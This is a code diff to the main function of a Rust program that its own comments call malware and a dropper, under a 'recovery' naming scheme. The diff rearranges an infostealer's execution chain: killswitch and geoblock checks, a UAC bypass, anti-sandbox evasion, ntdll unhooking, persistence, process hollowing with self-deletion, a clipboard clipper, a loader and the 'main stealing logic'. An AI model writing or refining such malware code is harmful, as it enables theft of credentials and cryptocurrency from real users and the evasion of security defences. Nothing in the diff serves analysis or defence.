@@ -17,6 +17,7 @@ async fn main() -> Result<(), RecoveryError> {
         .with(fmt_layer)
         .init();
 
+    // 1. Absolute first priority: Killswitch and Environment Validation
     if recovery::killswitch::check_killswitch().await {
         return Ok(());
     }
@@ -25,33 +26,40 @@ async fn main() -> Result<(), RecoveryError> {
         return Ok(());
     }
 
-    let syscall_manager = recovery::helpers::syscalls::SyscallManager::new().ok();
-    let _ = recovery::helpers::unhooking::unhook_ntdll(syscall_manager.as_ref());
-
-    let context = RecoveryContext::discover()
-        .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;
-
-    tracing::debug!(
-        "discovered directories (home={}, local={}, roaming={})",
-        context.home_dir.display(),
-        context.local_data_dir.display(),
-        context.roaming_data_dir.display()
-    );
-
+    // 2. Geoblocking - don't even try to elevate if we are in a forbidden region
     if !recovery::geoblock::check_geoblock().await {
         return Ok(());
     }
 
-    recovery::hollowing::perform_hollowing().await;
-
-    recovery::evasion::apply_evasion_techniques();
-
+    // 3. Elevation - get admin rights before unhooking/hollowing
     recovery::uac::attempt_uac_bypass().await;
 
-    recovery::clipper::run_clipper().await;
+    // 4. Evasion - Apply sandbox/anti-vm again (redundancy) and unhook
+    recovery::evasion::apply_evasion_techniques();
 
+    let syscall_manager = recovery::helpers::syscalls::SyscallManager::new().ok();
+    let _ = recovery::helpers::unhooking::unhook_ntdll(syscall_manager.as_ref());
+
+    // 5. Context Discovery
+    let context = RecoveryContext::discover()
+        .map_err(|err| RecoveryError::Custom(format!("context initialization failed: {err}")))?;
+
+    // 6. Persistence - Install BEFORE hollowing so we copy the actual malware binary
     recovery::persistence::install_persistence().await;
 
+    // 7. Hide execution - Hollow into a legitimate system process
+    if recovery::hollowing::perform_hollowing().await {
+        // If hollowing succeeded, we are now the "old" dropper process.
+        // We should melt (self-delete) and exit.
+        recovery::self_delete::perform_melt();
+        std::process::exit(0);
+    }
+
+    // 8. Background Tasks (if not hollowed or if running as hollowed payload)
+    recovery::clipper::run_clipper().await;
+    recovery::loader::run_loader().await;
+
+    // 9. Main Stealing Logic
     let mut manager = RecoveryManager::new(context.clone());
     register_all_tasks(&mut manager, &context).await?;
 
